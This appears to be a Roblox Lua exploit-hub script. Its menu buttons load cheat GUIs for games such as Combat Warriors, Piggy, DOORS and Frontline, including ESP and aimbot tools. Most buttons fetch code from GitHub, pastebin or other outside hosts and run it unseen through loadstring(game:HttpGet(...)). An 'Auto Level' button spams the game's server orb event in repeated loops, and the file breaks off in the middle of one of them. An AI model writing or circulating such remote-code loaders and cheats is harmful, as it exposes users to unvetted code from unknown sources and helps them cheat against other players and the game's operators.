Section:NewButton("Game: "..game.PlaceId.." | "..GameName, "", function()
    print("hi")
 end)

local Section = Tab:NewSection("Combat Warriors")
Section:NewButton("Combat Warrior Gui 1 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiritXmas/Project-Hook/main/required.lua"))()
end)
Section:NewButton("Combat Warrior Gui 2 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CheeseOnGithub/cheese-hook/main/main%20hydra%20ui.lua",true))()
end)
Section:NewButton("Combat Warrior Gui 3 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/Scripts/main/NOVA_HUB_SOURCE"))()
end)
Section:NewButton("Combat Warrior Gui 4 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
end)
Section:NewButton("Combat Warrior Gui 5 ", "", function()
loadstring(game:HttpGet("https://www.itots.tk/zaphub/combat-warriors.lua", true))()
end)

local Section = Tab:NewSection("Michael Zombie")
Section:NewButton("Michael Zombie Gui 1 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/MichaelZombies.lua"))()
end)
Section:NewButton("Michael Zombie Gui 2 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Michael's%20Zombies/MichaelsZombiesGUI"))()
end)
 
local Section = Tab:NewSection("Bee Swarm Simulator")
Section:NewButton("BSS Gui 1 ", "", function()
-- https://discord.gg/bss
loadstring(game:HttpGet("https://www.macrov2-script.xyz/macrov2.lua"))()
end)
Section:NewButton("BSS Gui 2 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/kocmoc-remastered.lua"))()
end)
Section:NewButton("BSS Gui 3 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Main.lua"))()
end)


 
local Section = Tab:NewSection("Piggy")
Section:NewButton("Piggy Gui 1 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/0piggy2", true))()
end)
Section:NewButton("Piggy Gui 2 ", "", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/tip52/useless-projects/main/piggy%20rb%20battles%20bit'))()
end)
Section:NewButton("Piggy Gui 3 ", "", function()
loadstring(game:HttpGet('https://pastebin.com/raw/pLNRr7jn'))()
end)
Section:NewButton("Piggy Gui 4 ", "", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/tip52/useless-projects/main/piggy%20rb%20battles%20bit'))()
end)
Section:NewButton("Piggy Gui 5 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Piggy/Piggy"))()
end)
 
local Section = Tab:NewSection("DOORS")
Section:NewButton("DOORS Gui 1 ", "", function()
loadstring(game:HttpGet('https://pastebin.com/raw/bxeZwRjU'))()
end)
Section:NewButton("DOORS Gui 2 ", "", function()
loadstring(game:HttpGet('https://pastebin.com/raw/pQ0f9r7D'))()
end)
Section:NewButton("DOORS Gui 3 ", "", function()
loadstring(game:HttpGet('https://pastebin.com/raw/tPEZAAuz'))()
end)
Section:NewButton("DOORS Gui 4 ", "", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
end)

local Section = Tab:NewSection("Frontline")
Section:NewButton("Frontline Gui 1 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SomacYT/better-script-frontline/main/Frontline%20somac%20hub%20v2"))()
end)
Section:NewButton("Frontline ESP ", "", function()
_G.ESP = {
    Boxes = true,
    Tracers = true,
    Rainbow = true,
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/mopsfl/roblox-scripts/main/.frontlines-esp.lua"))()
end)
Section:NewButton("Frontline Gui 2 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Frontlines/Modded_Aimhot.lua", true))()
end)

local Section = Tab:NewSection("Flee The Facility")
Section:NewButton("FleeTheFacility Gui 1 ", "idk", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OneProtocol/Project/main/Loader", true))()
end)
Section:NewButton("FleeTheFacility Gui 2 ", "idk", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/khoaScript/scripts/master/flee-the-facility.lua"))()
end)
Section:NewButton("FleeTheFacility Gui 3 ", "idk", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/bedra45/Random-games-xd/main/bedraFtfFinalGUI"))()
end)



local Section = Tab:NewSection("Legend Of Speed")
Section:NewButton("LegendOfSpeed Gui 1 ", "cool ok", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Legenos%20of%20speedos'))()
end)
Section:NewButton("LegendOfSpeed Gui 2 ", "cool ok", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/KrangH/ScriptsHub/main/Legends_Of_Speedv2"))()
end)
Section:NewButton("LegendOfSpeed Gui 3 ", "cool ok", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/KidScripts/Scripts/main/Silver-Hub-Keyless.lua",true))()
end)
Section:NewButton("LegendOfSpeed Gui 4 ", "cool ok", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/.lua'))()
end)

Section:NewButton("LegendOfSpeed Gui 5 ", "cool ok", function()
loadstring(Game:HttpGet("https://pastebin.com/raw/z3QF6pUX"))()
end)

Section:NewButton("Auto Level ", "no lie its super Op", function()
while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 